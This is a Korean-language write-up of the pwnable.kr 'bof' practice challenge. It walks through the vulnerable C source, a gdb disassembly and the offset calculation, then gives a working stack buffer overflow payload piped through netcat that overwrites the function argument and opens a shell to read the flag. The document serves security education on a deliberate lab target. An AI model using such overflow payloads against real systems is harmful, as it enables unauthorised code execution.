# bof - 5 pt

```text
Nana told me that buffer overflow is one of the most common software vulnerability.
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
```

## bof.c 소스코드를 보자

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);   // smash me!
    if(key == 0xcafebabe){
        system("/bin/sh");
    }
    else{
        printf("Nah..\n");
    }
}
int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
```

## 일단 netcat로 연결해 볼까요

```text
cxbt@CXBT:dsm2016$ nc pwnable.kr 9000
sdfasdf
overflow me :
Nah..
cxbt@CXBT:dsm2016$
```

아하... 실행파일을 준 이유가 이거였군요?! 아 이런

## 주어진 bof 실행파일을 디스어셈블링 해보자

```c
ch4sis@ubuntu:pwnable.kr$ gdb -q bof
Reading symbols from bof...(no debugging symbols found)...done.
(gdb) disas func
Dump of assembler code for function func:
   0x0000062c <+0>:     push   ebp
   0x0000062d <+1>:     mov    ebp,esp
   0x0000062f <+3>:     sub    esp,0x48
   0x00000632 <+6>:     mov    eax,gs:0x14
   0x00000638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
   0x0000063b <+15>:    xor    eax,eax
   0x0000063d <+17>:    mov    DWORD PTR [esp],0x78c
   0x00000644 <+24>:    call   0x645 <func+25>
   0x00000649 <+29>:    lea    eax,[ebp-0x2c]
   0x0000064c <+32>:    mov    DWORD PTR [esp],eax
   0x0000064f <+35>:    call   0x650 <func+36>
   0x00000654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x0000065b <+47>:    jne    0x66b <func+63>
   0x0000065d <+49>:    mov    DWORD PTR [esp],0x79b
   0x00000664 <+56>:    call   0x665 <func+57>
   0x00000669 <+61>:    jmp    0x677 <func+75>
   0x0000066b <+63>:    mov    DWORD PTR [esp],0x7a3
   0x00000672 <+70>:    call   0x673 <func+71>
   0x00000677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x0000067a <+78>:    xor    eax,DWORD PTR gs:0x14
   0x00000681 <+85>:    je     0x688 <func+92>
   0x00000683 <+87>:    call   0x684 <func+88>
   0x00000688 <+92>:    leave
   0x00000689 <+93>:    ret
End of assembler dump.
(gdb) disas main
Dump of assembler code for function main:
   0x0000068a <+0>:     push   ebp
   0x0000068b <+1>:     mov    ebp,esp
   0x0000068d <+3>:     and    esp,0xfffffff0
   0x00000690 <+6>:     sub    esp,0x10
   0x00000693 <+9>:     mov    DWORD PTR [esp],0xdeadbeef
   0x0000069a <+16>:    call   0x62c <func>
   0x0000069f <+21>:    mov    eax,0x0
   0x000006a4 <+26>:    leave
   0x000006a5 <+27>:    ret
```

주목할 점은 `*main+9`에서 esp 주소영역에 `0xdeadbeef` 값을 집어넣는다는 점, 그리고 `*func+74`에서 그 값을 `ebp+8`로 접근한다는 점이다. 프로그램이 `gets` 함수로 입력값을 제한된 크기 없이 받기 때문에 `0xdeadbeef`가 있는 영역을 덮어 씌우면 원하는 값을 `func` 함수의 인자로 조작할 수 있다. 그럼 저 위치를 계산해 보자.

```asm
   0x00000649 <+29>:    lea    eax,[ebp-0x2c]
   0x0000064c <+32>:    mov    DWORD PTR [esp],eax
   0x0000064f <+35>:    call   0x650 <func+36>
   0x00000654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
```

현재 우리가 입력하는 곳은 `[ebp-0x2c]`이고 우리가 덮어 씌워야 할곳은 `[ebp+8]`이다. `0x2c + 0x08 = 0x34 (52)`만큼 쓸모없는 데이터로 덮어씌운 후 `0xcafebabe`를 쓰면 된당

## 아무튼 그래서

```c
ch4sis@ubuntu:Desktop$ python -c "print 'A'*44+'B'*4+'C'*4+'\xbe\xba\xfe\xca'" > bof
ch4sis@ubuntu:Desktop$ (cat bof; cat) | nc pwnable.kr 9000
ls
bof
bof.c
flag
log
log2
super.pl
cat flag
daddy, I just pwned a buFFer :)
exit
*** stack smashing detected ***: /home/bof/bof terminated
overflow me :

ch4sis@ubuntu:Desktop$
```

이렇게 하면 된다ㅋ